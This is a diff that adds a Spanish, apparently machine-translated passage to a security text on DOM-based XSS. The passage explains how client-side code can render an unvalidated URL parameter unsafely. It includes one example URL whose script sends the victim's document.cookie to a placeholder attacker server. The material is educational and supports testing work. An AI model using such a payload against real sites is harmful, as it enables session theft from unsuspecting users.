@@ -46,6 +46,26 @@ requieren la participación del servidor, porque se ejecuta cuando la entrada de
 el código fuente de la página en el navegador directamente. El script XSS nunca es
 enviado al servidor, por lo que la respuesta HTTP del servidor no cambiará.
 
+Supongamos que un sitio web permite al usuario cambiar su configuración regional enviándolo a través de un parámetro de URL:
+https://example.com?locale=north+america El código del lado del cliente de la página web utilizará esta configuración regional para 
+construir un mensaje de bienvenida cuyo HTML se ve así: <h2> ¡Bienvenido, usuario de América del Norte! </h2>
+El parámetro de URL no se envía al servidor. En cambio, se usa localmente, por el navegador del usuario, para construir una página web usando un lado del cliente
+texto. Pero si el sitio web no valida el parámetro de configuración regional enviado por el usuario, un atacante puede engañar a los usuarios para que visiten una URL como esta:
+https://example.com?locale= <script> location = 'http: // attacker_server_ip /? c =' + document.cookie; </script>
+El sitio incorporará la carga útil en la página web del usuario y la víctima El navegador ejecutará el script malicioso.
+DOM XSS puede sonar mucho como XSS reflejado al principio. La diferencia es que la carga útil XSS reflejada se envía al servidor y se devuelve al
+navegador del usuario dentro de una respuesta HTTP. Por otro lado, el DOM La carga útil XSS se inyecta en una página debido a la representación
+del código del lado del cliente entrada del usuario de una manera insegura. Aunque los resultados de los dos ataques
+son similares, los procesos de prueba y protección contra ellos son diferentes.
+Los campos de entrada del usuario que pueden conducir a XSS reflejado y basado en DOM no siempre son parámetros de URL. A veces se muestran como fragmentos de URL.
+o nombres de ruta. Los fragmentos de URL son cadenas, ubicadas al final de una URL, que comience con un carácter #. A menudo se utilizan para dirigir automáticamente a los usuarios a
+una sección dentro de una página web o transferir información adicional. Por ejemplo, esta es una URL con un fragmento que lleva al usuario a la sección #about_us de
+la página de inicio del sitio:https: //example.com#about_us
+Hablaremos más sobre los componentes de una URL en el Capítulo 7. Para obtener información sobre DOM XSS y algunos ejemplos de cargas útiles, consulte PortSwigger
+artículo "XSS basado en DOM" en https://portswigger.net/web-security/cross-site-scripting/
+basado en dom
+
+
 #SELF XSS
 Los ataques Self-XSS requieren que las víctimas ingresen ellos mismos una carga útil maliciosa. Para realizarlos, los atacantes deben engañar a los usuarios para que hagan mucho más que simplemente
 ver una página o navegar a una URL en particular.Por ejemplo, supongamos que un campo del panel de control de un usuario es vulnerable a
